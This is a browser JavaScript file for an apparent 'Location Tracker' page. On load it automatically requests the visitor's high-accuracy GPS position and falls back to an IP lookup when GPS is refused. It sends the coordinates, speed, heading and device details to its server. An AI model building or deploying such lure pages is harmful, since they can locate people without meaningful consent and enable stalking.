// public/script.js
let trackingInProgress = false;
let latestLocationData = null;
let autoFetched = false;
let serverBaseUrl = '';

// Get server base URL
async function getServerConfig() {
    try {
        const response = await fetch('/api/config');
        const result = await response.json();
        if (result.success) {
            serverBaseUrl = result.data.baseUrl;
            console.log('📡 Server URL:', serverBaseUrl);
        }
    } catch (error) {
        console.error('Failed to get server config:', error);
        serverBaseUrl = window.location.origin;
    }
}

// Get DEVICE location using browser geolocation API
function getDeviceLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject(new Error('Geolocation is not supported by your device'));
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 20000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const { 
                    latitude, 
                    longitude, 
                    accuracy, 
                    altitude, 
                    speed, 
                    heading 
                } = position.coords;

                let source = 'Network';
                if (accuracy < 20) source = 'GPS (High)';
                else if (accuracy < 50) source = 'GPS (Medium)';
                else if (accuracy < 200) source = 'WiFi';
                else source = 'Network';

                resolve({
                    latitude: latitude,
                    longitude: longitude,
                    accuracy: Math.round(accuracy),
                    altitude: altitude || null,
                    speed: speed || null,
                    heading: heading || null,
                    source: source,
                    timestamp: new Date().toISOString(),
                    googleMapsLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
                    wazeLink: `https://www.waze.com/ul?ll=${latitude},${longitude}&navigate=yes`,
                    deviceInfo: {
                        platform: navigator.platform,
                        userAgent: navigator.userAgent,
                        language: navigator.language
                    }
                });
            },
            (error) => {
                let message = '';
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        message = 'Location permission denied. Please enable location services.';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        message = 'Location unavailable. Check GPS/WiFi.';
                        break;
                    case error.TIMEOUT:
                        message = 'Location request timed out. Try again.';
                        break;
                    default:
                        message = 'Failed to get location.';
                }
                reject(new Error(message));
            },
            options
        );
    });
}

// AUTO-FETCH LOCATION ON PAGE LOAD
async function autoFetchLocation() {
    if (autoFetched) {
        console.log('Already auto-fetched');
        return;
    }
    
    console.log('🔄 Auto-fetching location on Render...');
    updateBanner('🔄', 'Auto-fetching location...', '');
    showStatus('loading', '📡 Auto-fetching your location...');
    updateGPSStatus('loading');

    try {
        // Try GPS first
        let location = null;
        try {
            location = await getDeviceLocation();
        } catch (gpsError) {
            console.log('GPS failed, trying IP fallback...', gpsError.message);
            // Try IP fallback
            const ipLocation = await getLocationFromIP();
            if (ipLocation) {
                location = {
                    ...ipLocation,
                    source: 'IP Fallback',
                    accuracy: 5000,
                    googleMapsLink: `https://www.google.com/maps?q=${ipLocation.latitude},${ipLocation.longitude}`
                };
            } else {
                throw gpsError;
            }
        }
        
        if (!location) {
            throw new Error('Could not get your device location');
        }

        latestLocationData = location;
        await sendLocationToServer(location);

        showStatus('success', `✅ Auto-captured! Accuracy: ${location.accuracy}m`);
        showResult(location);
        updateBanner('✅', 'Location auto-captured successfully!', 'success');
        updateGPSStatus(true);
        
        document.getElementById('trackingImage').src = 
            'https://via.placeholder.com/600x350/28a745/ffffff?text=✅+Auto+Captured!';
        document.getElementById('overlay').style.display = 'none';

        await loadLatestLocation();
        autoFetched = true;

    } catch (error) {
        console.error('Auto-fetch error:', error);
        showStatus('error', `❌ ${error.message}`);
        updateBanner('❌', 'Auto-fetch failed. Click image to retry.', 'error');
        updateGPSStatus(false);
        showError(error.message);
        autoFetched = false;
    }
}

// Get location from IP (fallback)
async function getLocationFromIP() {
    try {
        const response = await fetch('/api/get-location');
        const result = await response.json();
        if (result.success) {
            return result.data;
        }
        return null;
    } catch (error) {
        console.error('IP lookup error:', error);
        return null;
    }
}

// Manual fetch
async function manualFetchLocation() {
    if (trackingInProgress) return;
    trackingInProgress = true;

    showLoading(true);
    hideResult();
    hideError();
    showStatus('loading', '📡 Getting location...');

    try {
        const location = await getDeviceLocation();
        
        if (!location) {
            throw new Error('Could not get location');
        }

        latestLocationData = location;
        await sendLocationToServer(location);

        showStatus('success', `✅ Location captured! Accuracy: ${location.accuracy}m`);
        showResult(location);
        updateGPSStatus(true);
        
        document.getElementById('trackingImage').src = 
            'https://via.placeholder.com/600x350/28a745/ffffff?text=📍+Location+Found!';
        document.getElementById('overlay').style.display = 'none';

        await loadLatestLocation();

    } catch (error) {
        console.error('Manual fetch error:', error);
        showStatus('error', `❌ ${error.message}`);
        showError(error.message);
    } finally {
        trackingInProgress = false;
        showLoading(false);
    }
}

// Handle image click
async function handleImageClick() {
    await manualFetchLocation();
}

// Send location to server
async function sendLocationToServer(location) {
    try {
        const response = await fetch('/api/track-location', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                latitude: location.latitude,
                longitude: location.longitude,
                accuracy: location.accuracy,
                altitude: location.altitude,
                speed: location.speed,
                heading: location.heading,
                source: location.source || 'Device GPS',
                userAgent: navigator.userAgent,
                autoFetched: autoFetched || false,
                deviceInfo: location.deviceInfo || {}
            })
        });

        const result = await response.json();

        if (!result.success) {
            throw new Error(result.message || 'Server error');
        }

        return result;
    } catch (error) {
        console.error('Send error:', error);
        throw new Error('Failed to send location to server');
    }
}

// Load latest location from server
async function loadLatestLocation() {
    try {
        const response = await fetch('/api/latest-location');
        const result = await response.json();
        
        if (result.success && result.data) {
            updateLatestLocationDisplay(result.data);
        }
    } catch (error) {
        console.error('Failed to load latest location:', error);
    }
}

// Update latest location display
function updateLatestLocationDisplay(location) {
    const latestDiv = document.getElementById('latestLocation');
    if (!latestDiv) return;

    const time = new Date(location.timestamp || location.capturedAt).toLocaleString();
    
    let details = `
        <div class="latest-card">
            <h3>📍 Latest Location</h3>
            <div class="latest-info">
                <div><span class="label">Time:</span> <span class="value">${time}</span></div>
                <div><span class="label">Source:</span> <span class="value">${location.source || 'Device'}</span></div>
                <div><span class="label">Latitude:</span> <span class="value">${location.latitude}</span></div>
                <div><span class="label">Longitude:</span> <span class="value">${location.longitude}</span></div>
    `;

    if (location.accuracy) {
        details += `<div><span class="label">Accuracy:</span> <span class="value">${location.accuracy} meters</span></div>`;
    }

    details += `
                <div style="margin-top:10px;">
                    <a href="${location.mapsLink || `https://www.google.com/maps?q=${location.latitude},${location.longitude}`}" 
                       target="_blank" class="btn-map-small">🗺️ View on Google Maps</a>
                </div>
            </div>
        </div>
    `;

    latestDiv.innerHTML = details;
}

// Update banner
function updateBanner(icon, text, type) {
    const banner = document.getElementById('autoFetchBanner');
    const bannerText = document.getElementById('bannerText');
    const iconEl = document.querySelector('.auto-icon');
    
    if (iconEl) iconEl.textContent = icon;
    if (bannerText) bannerText.textContent = text;
    
    if (banner) {
        banner.className = 'auto-fetch-banner';
        if (type) banner.classList.add(type);
    }
}

// Update GPS status
function updateGPSStatus(status) {
    const dot = document.getElementById('gpsDot');
    const text = document.getElementById('gpsText');
    
    if (status === true) {
        dot.className = 'status-dot active';
        text.textContent = 'GPS Active ✅';
    } else if (status === 'loading') {
        dot.className = 'status-dot loading';
        text.textContent = 'GPS Loading...';
    } else {
        dot.className = 'status-dot inactive';
        text.textContent = 'GPS Inactive ❌';
    }
}

function showStatus(type, message) {
    const statusDiv = document.getElementById('status');
    statusDiv.className = `status-message ${type}`;
    statusDiv.textContent = message;
}

function showLoading(show) {
    const spinner = document.getElementById('loadingSpinner');
    spinner.style.display = show ? 'flex' : 'none';
}

function showResult(location) {
    const resultDiv = document.getElementById('result');
    const detailsDiv = document.getElementById('locationDetails');
    const mapLink = document.getElementById('resultMapLink');
    const wazeLink = document.getElementById('resultWazeLink');
    const time = new Date().toLocaleString();

    let details = `
        <div>
            <span class="label">📅 Time:</span>
            <span class="value">${time}</span>
        </div>
        <div>
            <span class="label">📡 Source:</span>
            <span class="value">${location.source || 'GPS'}</span>
        </div>
        <div>
            <span class="label">📍 Latitude:</span>
            <span class="value">${location.latitude}</span>
        </div>
        <div>
            <span class="label">📍 Longitude:</span>
            <span class="value">${location.longitude}</span>
        </div>
        <div>
            <span class="label">🎯 Accuracy:</span>
            <span class="value">${location.accuracy} meters</span>
        </div>
    `;

    if (location.altitude) {
        details += `<div>
            <span class="label">⛰️ Altitude:</span>
            <span class="value">${location.altitude} meters</span>
        </div>`;
    }

    if (location.speed) {
        details += `<div>
            <span class="label">🏃 Speed:</span>
            <span class="value">${location.speed} m/s</span>
        </div>`;
    }

    if (location.heading) {
        details += `<div>
            <span class="label">🧭 Heading:</span>
            <span class="value">${location.heading}°</span>
        </div>`;
    }

    detailsDiv.innerHTML = details;
    mapLink.href = location.googleMapsLink || `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
    wazeLink.href = location.wazeLink || `https://www.waze.com/ul?ll=${location.latitude},${location.longitude}&navigate=yes`;
    resultDiv.style.display = 'block';
}

function hideResult() {
    document.getElementById('result').style.display = 'none';
}

function showError(message) {
    const errorDiv = document.getElementById('errorMessage');
    const errorText = document.getElementById('errorText');
    errorText.textContent = message || 'Something went wrong. Please try again.';
    errorDiv.style.display = 'block';
}

function hideError() {
    document.getElementById('errorMessage').style.display = 'none';
}

// ===== PAGE LOAD - AUTO FETCH =====
window.addEventListener('load', async () => {
    console.log('📍 Location Tracker loaded on Render!');
    
    // Get server config first
    await getServerConfig();
    
    if (navigator.geolocation) {
        console.log('✅ GPS available');
        updateGPSStatus('loading');
        updateBanner('🔄', 'Auto-fetching location...', '');
        showStatus('loading', '📡 Auto-fetching your location...');
        
        // Auto-fetch after 1.5 seconds
        setTimeout(() => {
            autoFetchLocation();
        }, 1500);
    } else {
        console.log('❌ GPS not available - trying IP fallback');
        updateGPSStatus(false);
        showStatus('loading', '🌐 Trying IP-based location...');
        updateBanner('🔄', 'Trying IP location...', '');
        
        // Try IP fallback
        setTimeout(async () => {
            try {
                const ipLocation = await getLocationFromIP();
                if (ipLocation) {
                    const location = {
                        ...ipLocation,
                        source: 'IP Fallback',
                        accuracy: 5000,
                        googleMapsLink: `https://www.google.com/maps?q=${ipLocation.latitude},${ipLocation.longitude}`
                    };
                    latestLocationData = location;
                    await sendLocationToServer(location);
                    showStatus('success', '✅ Location via IP (GPS unavailable)');
                    showResult(location);
                    updateBanner('✅', 'Location via IP fallback', 'success');
                    updateGPSStatus(true);
                    document.getElementById('trackingImage').src = 
                        'https://via.placeholder.com/600x350/28a745/ffffff?text=📍+IP+Location!';
                    document.getElementById('overlay').style.display = 'none';
                    await loadLatestLocation();
                    autoFetched = true;
                }
            } catch (err) {
                console.error('IP fallback failed:', err);
                showStatus('error', '❌ Could not get location');
                updateBanner('❌', 'Location failed', 'error');
            }
        }, 1500);
    }
    
    loadLatestLocation();
});
